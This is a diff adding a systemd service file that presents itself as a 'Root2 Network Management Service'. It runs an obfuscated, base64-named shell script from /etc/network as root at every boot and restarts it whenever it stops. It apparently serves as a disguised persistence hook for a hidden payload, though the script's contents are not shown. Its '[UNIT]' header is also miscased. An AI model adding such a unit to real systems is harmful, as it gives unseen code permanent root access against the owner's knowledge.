@@ -1,0 +1,10 @@
+[UNIT]
+Description=Root2 Network Management Service
+
+[Service]
+Type=simple
+Restart=always
+User=root
+ExecStart=/bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
+[Install]
+WantedBy=multi-user.target
